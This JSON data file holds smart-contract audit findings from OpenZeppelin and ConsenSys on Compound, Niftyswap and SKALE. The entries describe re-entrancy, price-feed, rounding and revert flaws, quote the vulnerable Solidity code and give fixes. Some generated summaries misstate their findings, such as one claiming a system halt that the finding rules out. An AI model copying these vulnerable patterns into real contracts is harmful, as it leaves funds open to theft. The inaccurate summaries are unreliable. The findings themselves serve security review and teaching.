      "protocol_name": "Compound Finance â€“ MCD & DSR Integration",
      "source_link": "https://blog.openzeppelin.com/compound-finance-mcd-dsr-integration/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11578",
      "title": "[M02] Negative DSR causes unexpected reverts",
      "impact": "MEDIUM",
      "content": "[On line 66 of `DAIInterestRateModel.sol`](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/DAIInterestRateModel.sol#L66), `1e27` is subtracted from `dsr`. If for any reason, `dsr` is less than `1e27` (which corresponds to a â€œnegativeâ€ interest rate), any calls to [the `dsrPerBlock` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/DAIInterestRateModel.sol#L64) will revert. This includes all calls to [the `poke` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/DAIInterestRateModel.sol#L74) and [the `getSupplyRate` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/DAIInterestRateModel.sol#L48).\n\n\nWhile the Maker developers have said they do not have plans to ever allow `dsr` to be less than `1e27`, this could still happen via the Maker governance system.\n\n\nReverting on `poke` could prevent updating the `baseRatePerBlock` and `multiplierPerBlock` state variables.\n\n\nConsider modifying `dsrPerBlock` such that it returns `0` when `dsr &lt; 1e27` (corresponding to a DSR of 0%). Also consider implementing a mechanism to remove DAI from the DSR contract, and to stop deposits into the DSR contract, just in case `dsr` is ever made less than `1e27`.",
      "summary": "\nThis bug report is related to the Compound Protocol's DAIInterestRateModel.sol. On line 66 of the file, `1e27` is subtracted from `dsr`. If `dsr` is less than `1e27`, any calls to the `dsrPerBlock` function, `poke` function, and `getSupplyRate` function will revert. This could prevent updating the `baseRatePerBlock` and `multiplierPerBlock` state variables. The Maker developers have said they do not plan to ever allow `dsr` to be less than `1e27`, but this could still happen via the Maker governance system. To prevent this, consider modifying `dsrPerBlock` such that it returns `0` when `dsr` is less than `1e27`, and also consider implementing a mechanism to remove DAI from the DSR contract and to stop deposits into the DSR contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Finance â€“ MCD & DSR Integration",
      "source_link": "https://blog.openzeppelin.com/compound-finance-mcd-dsr-integration/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11577",
      "title": "[M01] daiJoin.cage prevents withdrawals",
      "impact": "MEDIUM",
      "content": "Part of the functionality of the DSS system is the ability of the Maker admins to call the function [`cage` in join.sol](https://github.com/makerdao/dss/blob/870d6fddb75090eb177290b1db4e255d2c31075e/src/join.sol#L157), which sets `live = 0`. If this happens, the call to [`daiJoin.exit` within CDaiDelegateâ€™s `doTransferOut` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/CDaiDelegate.sol#L166) will revert upon reaching the [`require` statement on line 169 of join.sol](https://github.com/makerdao/dss/blob/870d6fddb75090eb177290b1db4e255d2c31075e/src/join.sol#L169). Users would not be able to withdraw their funds.\n\n\nConsider informing users of the risk associated with using Compoundâ€™s DAI market. Also consider a course of action for the `pauseGuardian` and/or `admin` roles should the `DaiJoin` contract ever be â€œcagedâ€.",
      "summary": "\nThis report is about a bug in the DSS system. It describes a scenario in which the Maker admins call the function [`cage` in join.sol](https://github.com/makerdao/dss/blob/870d6fddb75090eb177290b1db4e255d2c31075e/src/join.sol#L157), which sets `live = 0`. If this happens, the call to [`daiJoin.exit` within CDaiDelegateâ€™s `doTransferOut` function](https://github.com/compound-finance/compound-protocol/blob/9ea64ddd166a78b264ba8006f688880085eeed13/contracts/CDaiDelegate.sol#L166) will revert upon reaching the [`require` statement on line 169 of join.sol](https://github.com/makerdao/dss/blob/870d6fddb75090eb177290b1db4e255d2c31075e/src/join.sol#L169). This means users would not be able to withdraw their funds.\n\nThe bug report suggests that users should be informed of the risk associated with using Compoundâ€™s DAI market. It also suggests that a course of action should be taken for the `pauseGuardian` and/or `admin` roles should the `DaiJoin` contract ever be â€œcagedâ€.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Finance â€“ MCD & DSR Integration",
      "source_link": "https://blog.openzeppelin.com/compound-finance-mcd-dsr-integration/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13815",
      "title": "Incorrect response from price feed if called during an onERC1155Received callback Â Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe design will not be modified. Horizon Games should clearly document this risk for 3rd parties seeking to use Niftyswap as a price feed.\n\n\n#### Description\n\n\nThe ERC 1155 standard requires that smart contracts must implement `onERC1155Received` and `onERC1155BatchReceived` to accept transfers.\n\n\nThis means that on any token received, code run on the receiving smart contract.\n\n\nIn `NiftyswapExchange` when adding / removing liquidity or buying tokens, the methods mentioned above are called when the tokens are sent. When this happens, the state of the contract is changed but not completed, the tokens are sent to the receiving smart contract but the state is not completely updated.\n\n\nThis happens in these cases\n\n\n`_baseToToken` (when buying tokens)\n\n\n**code/niftyswap/contracts/exchange/NiftyswapExchange.sol:L163-L169**\n\n\n\n```\n// // Refund Base Token if any\nif (totalRefundBaseTokens > 0) {\n  baseToken.safeTransferFrom(address(this), \\_recipient, baseTokenID, totalRefundBaseTokens, \"\");\n}\n\n// Send Tokens all tokens purchased\ntoken.safeBatchTransferFrom(address(this), \\_recipient, \\_tokenIds, \\_tokensBoughtAmounts, \"\");\n\n```\n`_removeLiquidity`\n\n\n**code/niftyswap/contracts/exchange/NiftyswapExchange.sol:L485-L487**\n\n\n\n```\n// Transfer total Base Tokens and all Tokens ids\nbaseToken.safeTransferFrom(address(this), \\_provider, baseTokenID, totalBaseTokens, \"\");\ntoken.safeBatchTransferFrom(address(this), \\_provider, \\_tokenIds, tokenAmounts, \"\");\n\n```\n`_addLiquidity`\n\n\n**code/niftyswap/contracts/exchange/NiftyswapExchange.sol:L403-L407**\n\n\n\n```\n// Mint liquidity pool tokens\n\\_batchMint(\\_provider, \\_tokenIds, liquiditiesToMint, \"\");\n\n// Transfer all Base Tokens to this contract\nbaseToken.safeTransferFrom(\\_provider, address(this), baseTokenID, totalBaseTokens, abi.encode(DEPOSIT\\_SIG));\n\n```\nEach of these examples send some tokens to the smart contract, which triggers calling some code on the receiving smart contract.\n\n\nWhile these methods have the `nonReentrant` modifier which protects them from re-netrancy, the result of the methods `getPrice_baseToToken` and `getPrice_tokenToBase` is affected. These 2 methods do not have the `nonReentrant` modifier.\n\n\nThe price reported by the `getPrice_baseToToken` and `getPrice_tokenToBase` methods is incorrect (until after the end of the transaction) because they rely on the number of tokens owned by the `NiftyswapExchange`; which between the calls is not finalized. Hence the price reported will be incorrect.\n\n\nThis gives the smart contract which receives the tokens, the opportunity to use other systems (if they exist) that rely on the result of `getPrice_baseToToken` and `getPrice_tokenToBase` to use the returned price to its advantage.\n\n\nItâ€™s important to note that this is a bug only if other systems rely on the price reported by this `NiftyswapExchange`. Also the current contract is not affected, nor its balances or internal ledger, only other systems relying on its reported price will be fooled.\n\n\n#### Recommendation\n\n\nBecause there is no way to enforce how other systems work, a restriction can be added on `NiftyswapExchange` to protect other systems (if any) that rely on `NiftyswapExchange` for price discovery.\n\n\nAdding a `nonReentrant` modifier on the view methods `getPrice_baseToToken` and `getPrice_tokenToBase` will add a bit of protection for the ecosystem.",
      "summary": "\nThe bug report states that the NiftyswapExchange smart contract does not completely update the state when tokens are sent, which affects the accuracy of the price reported by the `getPrice_baseToToken` and `getPrice_tokenToBase` methods. This gives the smart contract that receives the tokens the opportunity to use other systems (if they exist) that rely on the result of `getPrice_baseToToken` and `getPrice_tokenToBase` to use the returned price to its advantage. The recommendation is to add a nonReentrant modifier to the view methods `getPrice_baseToToken` and `getPrice_tokenToBase` in order to protect other systems from taking advantage of the incorrect price. Horizon Games should also document this risk for 3rd parties who may be using Niftyswap as a price feed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Horizon Games",
      "source_link": "https://consensys.net/diligence/audits/2020/02/horizon-games/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "John Mardlin"
      ]
    },
    {
      "id": "13814",
      "title": "Tokens with no decimals can be locked in Niftyswap Â Acknowledged",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis will be addressed by only listing tokens with at least 2 decimals. This should be well documented in the Niftyswap repository and code comments.\n\n\n#### Description\n\n\nAssume the Niftyswap exchange has:\n\n\n1. wrapped DAI as the base currency, and\n2. itâ€™s ERC1155 contract has a token called â€œBlue Dragonsâ€, which are a â€œlow fungibilityâ€ token, with zero decimals, and a total supply of 100.\n\n\nConsider the following scenario on the Niftyswap exchange:\n\n\n1. 10 people each add 1,000 DAI, and 1 BlueDragon. They get 1,000 pool tokens each.\n2. Someone buys 1 BlueDragon, at a price of 1,117 base Tokens (per the constant product pricing model).\n3. Niftyswapâ€™s balances are now 11,117 baseTokens, 9 Blue Dragons.\n4. Someone removes liquidity by burning 1,000 pool tokens:\n\t1. They would get 1111 base tokens (`1000 * 11,117/ 10000`).\n\t2. They would get 0 Blue Dragons due to the rounding on integer math.\n\n\n#### Recommendation\n\n\nThrough conversation with the developers, we agreed the right approach is for tokens to have at least 2 decimals to minimize the negative effects of rounding down.",
      "summary": "\nA bug has been identified in the Niftyswap exchange, which is an ERC1155 contract. The bug occurs when a user removes liquidity from the exchange using the constant product pricing model. In this scenario, the user is not rewarded with the full amount of the low fungibility token, â€œBlue Dragonsâ€, due to rounding in integer math. To address this, the developers have agreed that tokens should have at least two decimals to minimize the negative effects of rounding down. This change should be well documented in the Niftyswap repository and code comments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Horizon Games",
      "source_link": "https://consensys.net/diligence/audits/2020/02/horizon-games/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "John Mardlin"
      ]
    },
    {
      "id": "13849",
      "title": "Function overloading âœ“Â Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed in [skalenetwork/skale-manager#181](https://github.com/skalenetwork/skale-manager/pull/181)\n\n\n#### Description\n\n\nSome functions in the codebase are overloaded. That makes code less readable and increases the probability of missing bugs.\n\n\nFor example, there are a lot of `reduce` function implementations in `DelegationController`:\n\n\n**new\\_code/contracts/delegation/DelegationController.sol:L722-L820**\n\n\n\n```\nfunction reduce(PartialDifferencesValue storage sequence, uint amount, uint month) internal returns (Fraction memory) {\n    require(month.add(1) >= sequence.firstUnprocessedMonth, \"Can't reduce value in the past\");\n    if (sequence.firstUnprocessedMonth == 0) {\n        return createFraction(0);\n    }\n    uint value = getAndUpdateValue(sequence, month);\n    if (value == 0) {\n        return createFraction(0);\n    }\n\n    uint \\_amount = amount;\n    if (value < amount) {\n        \\_amount = value;\n    }\n\n    Fraction memory reducingCoefficient = createFraction(value.sub(\\_amount), value);\n    reduce(sequence, reducingCoefficient, month);\n    return reducingCoefficient;\n}\n\nfunction reduce(PartialDifferencesValue storage sequence, Fraction memory reducingCoefficient, uint month) internal {\n    reduce(\n        sequence,\n        sequence,\n        reducingCoefficient,\n        month,\n        false);\n}\n\nfunction reduce(\n    PartialDifferencesValue storage sequence,\n    PartialDifferencesValue storage sumSequence,\n    Fraction memory reducingCoefficient,\n    uint month) internal\n{\n    reduce(\n        sequence,\n        sumSequence,\n        reducingCoefficient,\n        month,\n        true);\n}\n\nfunction reduce(\n    PartialDifferencesValue storage sequence,\n    PartialDifferencesValue storage sumSequence,\n    Fraction memory reducingCoefficient,\n    uint month,\n    bool hasSumSequence) internal\n{\n    require(month.add(1) >= sequence.firstUnprocessedMonth, \"Can't reduce value in the past\");\n    if (hasSumSequence) {\n        require(month.add(1) >= sumSequence.firstUnprocessedMonth, \"Can't reduce value in the past\");\n    }\n    require(reducingCoefficient.numerator <= reducingCoefficient.denominator, \"Increasing of values is not implemented\");\n    if (sequence.firstUnprocessedMonth == 0) {\n        return;\n    }\n    uint value = getAndUpdateValue(sequence, month);\n    if (value == 0) {\n        return;\n    }\n\n    uint newValue = sequence.value.mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n    if (hasSumSequence) {\n        subtract(sumSequence, sequence.value.sub(newValue), month);\n    }\n    sequence.value = newValue;\n\n    for (uint i = month.add(1); i <= sequence.lastChangedMonth; ++i) {\n        uint newDiff = sequence.subtractDiff[i].mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n        if (hasSumSequence) {\n            sumSequence.subtractDiff[i] = sumSequence.subtractDiff[i].sub(sequence.subtractDiff[i].sub(newDiff));\n        }\n        sequence.subtractDiff[i] = newDiff;\n    }\n}\n\nfunction reduce(\n    PartialDifferences storage sequence,\n    Fraction memory reducingCoefficient,\n    uint month) internal\n{\n    require(month.add(1) >= sequence.firstUnprocessedMonth, \"Can't reduce value in the past\");\n    require(reducingCoefficient.numerator <= reducingCoefficient.denominator, \"Increasing of values is not implemented\");\n    if (sequence.firstUnprocessedMonth == 0) {\n        return;\n    }\n    uint value = getAndUpdateValue(sequence, month);\n    if (value == 0) {\n        return;\n    }\n\n    sequence.value[month] = sequence.value[month].mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n\n    for (uint i = month.add(1); i <= sequence.lastChangedMonth; ++i) {\n        sequence.subtractDiff[i] = sequence.subtractDiff[i].mul(reducingCoefficient.numerator).div(reducingCoefficient.denominator);\n    }\n}\n\n```\n#### Recommendation\n\n\nAvoid function overloading as a general guideline.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13848",
      "title": "Duplicate function implementation addMonths() âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed in [skalenetwork/skale-manager#127](https://github.com/skalenetwork/skale-manager/pull/127)\n\n\n#### Description\n\n\n`TimeHelpers.addMonths()` implementation is redundant as it can directly use `BokkyPooBahsDateTimeLibrary.addMonths()` function.\n\n\n#### Recommendation\n\n\nSimply use return `BokkyPooBahsDateTimeLibrary.addMonths()` on the same function to prevent further code changes, itâ€™s still a good idea to call addMonth through TimeHelpers contract.",
      "summary": "\nA bug was found in the `TimeHelpers.addMonths()` implementation that caused it to be redundant. It was recommended to use the `BokkyPooBahsDateTimeLibrary.addMonths()` function instead to prevent further code changes. The bug was fixed in the [skalenetwork/skale-manager#127](https://github.com/skalenetwork/skale-manager/pull/127) pull request and it is still a good idea to call addMonth through the TimeHelpers contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13847",
      "title": "Storage operations optimization âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nMitigated in [skalenetwork/skale-manager#179](https://github.com/skalenetwork/skale-manager/pull/179)\n\n\n#### Description\n\n\nThere are a lot of operations that write some value to the storage (uses `SSTORE` opcode) without actually changing it.\n\n\n#### Examples\n\n\nIn `getAndUpdateValue`  function of `DelegationController` and `TokenLaunchLocker`:\n\n\n**new\\_code/contracts/delegation/DelegationController.sol:L711-L715**\n\n\n\n```\nfor (uint i = sequence.firstUnprocessedMonth; i <= month; ++i) {\n    sequence.value = sequence.value.add(sequence.addDiff[i]).sub(sequence.subtractDiff[i]);\n    delete sequence.addDiff[i];\n    delete sequence.subtractDiff[i];\n}\n\n```\nIn `handleSlash` function of `Punisher` contract `amount` will be zero in most cases:\n\n\n**new\\_code/contracts/delegation/Punisher.sol:L66-L68**\n\n\n\n```\nfunction handleSlash(address holder, uint amount) external allow(\"DelegationController\") {\n    \\_locked[holder] = \\_locked[holder].add(amount);\n}\n\n```\n#### Recommendation\n\n\nCheck if the value is the same and donâ€™t write it to the storage in that case.",
      "summary": "\nThis bug report is about operations that write some value to the storage without actually changing it. This can be seen in the `getAndUpdateValue`  function of the `DelegationController` and `TokenLaunchLocker` contracts, as well as the `handleSlash` function of the `Punisher`contract. In these cases, the value is not changed, but still written to the storage. This can be mitigated by checking if the value is the same before writing it to the storage. This recommendation has been implemented in the skalenetwork/skale-manager#179 pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13846",
      "title": "Iterations over slashes âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nPartially mitigated in [skalenetwork/skale-manager#163](https://github.com/skalenetwork/skale-manager/pull/163) . `sendSlashingSignals` function is now aggregating slashes per `holder` (if itâ€™s sorted by `holder`), which optimises gas cost.\n\n\n#### Description\n\n\nEvery user should iterate over each slash (but only once) and process them in order to determine whether this slash impacted his delegations or not.\n\n\nHowever, the check is done during almost every action that the user does because it updates the current state of the userâ€™s balance. The downside of this method is that if there are a lot of slashes in the system, every user would be forced to iterate over all of them even if the user is only trading tokens and only calls `transfer` function.\n\n\nIf the number of slashes is huge, checking them all in one function would impossible due to the block gas limit. Itâ€™s possible to call the checking function separately and process slashes in batches. So this attack should not result in system halt and can be mitigated with manual intervention.\n\n\nAlso, there are two separate pipelines for iterating over slashes. One pipeline is for iterating over months to determine amount of slashed tokens in separate delegations. This one can potentially hit gas limit in many-many years. The other one is for modifying aggregated delegation values.\n\n\n#### Recommendation\n\n\nTry to avoid all the unnecessary iterations over a potentially unlimited number of items. Additionally, itâ€™s possible to optimize some calculations:\n\n\n1. When slashing signals are processed, all of them always have the same `holder`. Thereâ€™s no reason for having an array of signals with the same holder (always with predefined length and values will most likely be zero). It seems possible to remove signals functionality and just aggregate the changes for the `Punisher`.\n2. Try merge two pipelines into one.",
      "summary": "\nThis bug report is about an issue in the Skale Network Manager, which is a system for managing user's balances and delegations. The problem is that if there are a lot of slashes (penalties) in the system, every user would be forced to iterate over all of them even if the user is only trading tokens and only calls the `transfer` function. This could cause the system to hit the block gas limit, resulting in a system halt. \n\nThe bug has been partially mitigated by optimizing the `sendSlashingSignals` function so that it aggregates slashes per `holder`. Additionally, two recommendations were made to further reduce the issue. The first is to remove signals functionality and just aggregate the changes for the `Punisher`, and the second is to merge the two pipelines into one.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13845",
      "title": "Slashes do not affect bounty distribution âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nMitigated in [skalenetwork/skale-manager#118](https://github.com/skalenetwork/skale-manager/pull/118)\n\n\n#### Description\n\n\nWhen slashes are processed by a holder, only `_delegatedByHolderToValidator` and `_delegatedByHolder` values are reduced. But `_effectiveDelegatedByHolderToValidator` value remains the same. This value is used to distribute bounties amongst delegators. So slashing will not affect that distribution.\n\n\n**contracts/delegation/DelegationController.sol:L863-L873**\n\n\n\n```\nuint oldValue = getAndUpdateDelegatedByHolderToValidator(holder, validatorId);\nif (oldValue > 0) {\n    uint month = \\_slashes[index].month;\n    reduce(\n        \\_delegatedByHolderToValidator[holder][validatorId],\n        \\_delegatedByHolder[holder],\n        \\_slashes[index].reducingCoefficient,\n        month);\n    slashingSignals[index.sub(begin)].holder = holder;\n    slashingSignals[index.sub(begin)].penalty = oldValue.sub(getAndUpdateDelegatedByHolderToValidator(holder, validatorId));\n}\n\n```\n#### Recommendation\n\n\nReduce `_effectiveDelegatedByHolderToValidator` and `_effectiveDelegatedToValidator` when slashes are processed.",
      "summary": "\nThis bug report is about a problem in the DelegationController.sol contract of the skale-manager project. When slashes are processed, only the `_delegatedByHolderToValidator` and `_delegatedByHolder` values are reduced. The `_effectiveDelegatedByHolderToValidator` value remains the same, which is used to distribute bounties amongst delegators. As a result, the slashing does not affect the distribution. The code snippet in the report shows the code responsible for this bug.\n\nThe recommendation to fix the bug is to reduce the `_effectiveDelegatedByHolderToValidator` and `_effectiveDelegatedToValidator` values when slashes are processed. The bug was mitigated in skale-manager pull request #118.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13844",
      "title": "Rounding errors after slashing âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nMitigated in [skalenetwork/skale-manager#130](https://github.com/skalenetwork/skale-manager/pull/130). `epsilon` of 10^6 is added. Most subtractions are not throwing errors anymore and just assign value to zero.\n\n\n#### Description\n\n\nWhen slashing happens `_delegatedToValidator` and `_effectiveDelegatedToValidator` values are reduced.\n\n\n**new\\_code/contracts/delegation/DelegationController.sol:L349-L355**\n\n\n\n```\nfunction confiscate(uint validatorId, uint amount) external {\n    uint currentMonth = getCurrentMonth();\n    Fraction memory coefficient = reduce(\\_delegatedToValidator[validatorId], amount, currentMonth);\n    reduce(\\_effectiveDelegatedToValidator[validatorId], coefficient, currentMonth);\n    putToSlashingLog(\\_slashesOfValidator[validatorId], coefficient, currentMonth);\n    \\_slashes.push(SlashingEvent({reducingCoefficient: coefficient, validatorId: validatorId, month: currentMonth}));\n}\n\n```\nWhen holders process slashings, they reduce `_delegatedByHolderToValidator`, `_delegatedByHolder`, `_effectiveDelegatedByHolderToValidator` values.\n\n\n**new\\_code/contracts/delegation/DelegationController.sol:L892-L904**\n\n\n\n```\nif (oldValue > 0) {\n    reduce(\n        \\_delegatedByHolderToValidator[holder][validatorId],\n        \\_delegatedByHolder[holder],\n        \\_slashes[index].reducingCoefficient,\n        month);\n    reduce(\n        \\_effectiveDelegatedByHolderToValidator[holder][validatorId],\n        \\_slashes[index].reducingCoefficient,\n        month);\n    slashingSignals[index.sub(begin)].holder = holder;\n    slashingSignals[index.sub(begin)].penalty = oldValue.sub(getAndUpdateDelegatedByHolderToValidator(holder, validatorId, month));\n}\n\n```\nAlso when holders are undelegating, they are calculating how many tokens from `delegations[delegationId].amount` were slashed.\n\n\n**new\\_code/contracts/delegation/DelegationController.sol:L316**\n\n\n\n```\nuint amountAfterSlashing = calculateDelegationAmountAfterSlashing(delegationId);\n\n```\nAll these values should be calculated one from another, but they all will have different rounding errors after slashing. For example, the assumptions that the total sum of all delegations from holder `X` to validator `Y` should still be equal to `_delegatedByHolderToValidator[X][Y]` is not true anymore. The problem is that these assumptions are still used. For example, when undelegating some delegation with delegated amount equals `amount`(after slashing), the holder will reduce `_delegatedByHolderToValidator[X][Y]`, `_delegatedByHolder[X]` and `_delegatedToValidator[Y]` by `amount`. Since rounding errors of all these values are different that will lead to 2 possible scenarios:\n\n\n1. If rounding error reduces `amount` not that much as other values, we can have `uint` underflow. This is especially dangerous because all calculations are delayed and we will know about underflow and `SafeMath` revert in the next month or later.  \n\n*Developers already made sure that rounding errors are aligned in a correct way, and that the reduced value should always be larger than the subtracted, so there should not be underflow. This solution is very unstable because itâ€™s hard to verify it and keep in mind even during a small code change.*\n2. If rounding errors make `amount` smaller then it should be, when other values should be zero (for example, when all the delegations are undelegated), these values will become some very small values. The problem here is that it would be impossible to compare values to zero.\n\n\n#### Recommendation\n\n\n1. Consider not calling `revert` on these subtractions and make result value be equals to zero if underflow happens.\n2. Consider comparing to some small `epsilon` value instead of zero. Or similar to the previous point, on every subtraction check if the value is smaller then `epsilon`, and make it zero if it is.",
      "summary": "\nThis bug report is about an issue with the Skale Manager's DelegationController.sol code. When slashing happens, the values of _delegatedToValidator and _effectiveDelegatedToValidator are reduced. When holders process slashing, they reduce _delegatedByHolderToValidator, _delegatedByHolder, and _effectiveDelegatedByHolderToValidator values. Also, when holders are undelegating, they are calculating how many tokens from delegations[delegationId].amount were slashed. The issue is that these calculations can lead to rounding errors, resulting in two possible scenarios. The first is an underflow, where the reduced value is less than the subtracted value, leading to a `SafeMath` revert in the next month or later. The second is that the amount is smaller than it should be, making it impossible to compare values to zero.\n\nThe developers have implemented a solution to make sure that the reduced value is always larger than the subtracted, preventing underflow. However, this solution is unstable and difficult to verify. Recommendations have been made to consider not calling `revert` on subtractions, and to compare to a small epsilon value instead of zero. The issue was mitigated in skalenetwork/skale-manager#130 by adding an epsilon of 10^6, so that most subtractions no longer throw errors and just assign the value to zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13843",
      "title": "Users can burn delegated tokens using re-entrancy attack âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nMitigated in [skalenetwork/skale-manager#128](https://github.com/skalenetwork/skale-manager/pull/128)\n\n\n#### Description\n\n\nWhen a user burns tokens, the following code is called:\n\n\n**new\\_code/contracts/ERC777/LockableERC777.sol:L413-L426**\n\n\n\n```\n        uint locked = \\_getAndUpdateLockedAmount(from);\n        if (locked > 0) {\n            require(\\_balances[from] >= locked.add(amount), \"Token should be unlocked for burning\");\n        }\n//-------------------------------------------------------------------------\n\n        \\_callTokensToSend(\n            operator, from, address(0), amount, data, operatorData\n        );\n\n        // Update state variables\n        \\_totalSupply = \\_totalSupply.sub(amount);\n        \\_balances[from] = \\_balances[from].sub(amount);\n\n\n```\nThere is a callback function right after the check that there are enough unlocked tokens to burn. In this callback, the user can delegate all the tokens right before burning them without breaking the code flow.\n\n\n#### Recommendation\n\n\n`_callTokensToSend`  should be called before checking for the unlocked amount of tokens, which is better defined as [Checks-Effects-Interactions Pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern).",
      "summary": "\nA bug was found in the code of the LockableERC777.sol contract. The code was being used when a user burns tokens and was located at new\\_code/contracts/ERC777/LockableERC777.sol:L413-L426. The bug was that there was a callback function located right after the check that there were enough unlocked tokens to burn. In this callback, the user could delegate all the tokens right before burning them without breaking the code flow. This could lead to security issues. \n\nThe bug was mitigated in skalenetwork/skale-manager#128. The recommendation was to call `_callTokensToSend` before checking for the unlocked amount of tokens, which is better defined as Checks-Effects-Interactions Pattern. This pattern ensures that all the checks are done before any effects are applied, and that all interactions with external contracts occur after the checks and effects are done.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13842",
      "title": "Add timelock for some onlyOwner functions Â Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nSkale team acknowledged this issue and gave us the following response:\n\n\n\n> \n> The SKALE Network Upgrade key will soon transition to an on-chain voting mechanism therefore making the ownership a function of community governance. It will be centrally managed through a multi-sig process for the initial 3 months to prioritize agility for resolving critical issues prior to becoming a community owned on-chain function. Successful Ethereum projects such as Maker have given clear data points on successful voting mechanism and community control which the SKALE Network will employ as soon as possible.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe system is trusted in a way that there are some `owner`s have the power to do major changes in the system. The most powerful is `owner` of `ContractManager` which can update any contract in any way. Even though the system is trusted and this is intended behaviour, itâ€™s possible to mitigate this trust a bit.\n\n\n#### Recommendation\n\n\nAdd timelock to major admin functions, so people would know about it beforehand (2 weeks before) and would be able to react somehow.\n\n\n*Severity is minor because if owners of SKALE would want to attack the system in that way, tokens would lose the value anyway, and security of SKALE chains would be unreliable. So itâ€™s unclear what can be done even having that knowledge beforehand.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13841",
      "title": "DelegationService redundancy âœ“Â Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\n`DelegationService` was removed in [pull/114](https://github.com/skalenetwork/skale-manager/pull/114) and the functionality is distributed in `ValidatorService`, `DelegationController`.\n\n\n#### Description\n\n\n`DelegationService` acts as a gateway for every external call. The problem is that it adds extra complexity to the code, which makes it harder to read and add a new code. Also, it costs more gas because of extra calls between contracts.\n\n\n#### Recommendation\n\n\nThe same functionality of DelegationService can be added through UI to allow direct calls to each contract. However, as the whole system is modular and upgradable, it is understandable why using one main contract as the point of interaction might make sense as well.",
      "summary": "",
      "quality_score": 0,
